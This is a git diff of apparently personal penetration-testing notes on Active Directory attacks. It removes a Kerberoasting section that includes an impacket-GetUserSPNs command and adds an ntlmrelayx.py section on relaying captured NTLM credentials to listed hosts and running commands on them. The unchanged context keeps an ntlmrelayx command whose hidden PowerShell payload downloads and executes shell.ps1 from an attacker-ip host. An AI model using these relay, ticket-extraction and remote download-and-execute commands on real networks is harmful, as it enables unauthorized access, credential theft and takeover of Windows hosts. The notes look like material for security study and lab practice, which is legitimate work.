@@ -1,15 +1,4 @@
-**Active Directory** (AD) is a directory service developed by Microsoft for managing and organizing information about network resources, such as computers, users, and devices, within a Windows network environment. It serves as a centralized database that enables administrators to efficiently and securely manage and authenticate users, computers, and other network elements.
-
-Useful video: https://www.youtube.com/watch?v=-bNb4hwgkCo&t=1s
-# Kerberoasting
-It is a method used to extract and crack service account passwords that utilize Kerberos authentication within a Windows Active Directory environment. This attack targets accounts with Kerberos Service Principal Names (SPNs) set, allowing attackers to request encrypted service tickets from the domain controller.
-- One method that can be used is using 'impacket-GetUserSPNs'. If we have a user with a username ended in *TGS* that means that is part of a TICKET GRANTING SERVICE. We can use this to ask a ticket to the Domain Controller.
-```bash
-impacket-GetUserSPNs -request -dc-ip target_ip domain_name/user
-```
-
 # SMB Relay
-
 **SMB Relay** is a type of attack that targets the Server Message Block (SMB) protocol used primarily for providing shared access to files, printers, and serial ports in a network.
 
 The attack involves intercepting and relaying SMB authentication attempts to another SMB server, allowing an attacker to gain unauthorized access or execute commands with the victim's credentials.
@@ -64,4 +53,27 @@ python3 -m http.server 80
 - Run NTLMRelayx.py with the Reverse Shell Command:
 ```bash
 sudo ntlmrelayx.py -tf targets.txt -smb2support -c "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"iex(New-Object Net.WebClient).DownloadString('http://attacker-ip/shell.ps1')\""
+```
+
+
+# NTLMRelayx.py
+
+**ntlmrelayx.py** is a powerful tool from the Impacket toolkit used for relaying captured NTLM authentication attempts to other network services. It is particularly effective in Windows Active Directory (AD) environments, allowing attackers to gain unauthorized access to network resources by relaying credentials.
+
+## Configuring Target List:
+
+- Create a `targets.txt` file with the IP addresses or hostnames of the target AD servers you want to relay the captured credentials to.
+```bash
+192.168.1.10 
+192.168.1.11
+```
+## Starting NTLMRelayx.py:
+
+- Use NTLMRelayx.py to relay captured NTLM authentication attempts to the targets listed in `targets.txt`.
+```bash
+sudo ntlmrelayx.py -tf targets.txt -smb2support
+```
+- Also, NTLMRelayx.py can be configured to execute a certain command of our election after pawning one of the target hosts. 
+```bash
+sudo ntlmrelayx.py -tf targets.txt -smb2support -c "<command>"
 ```
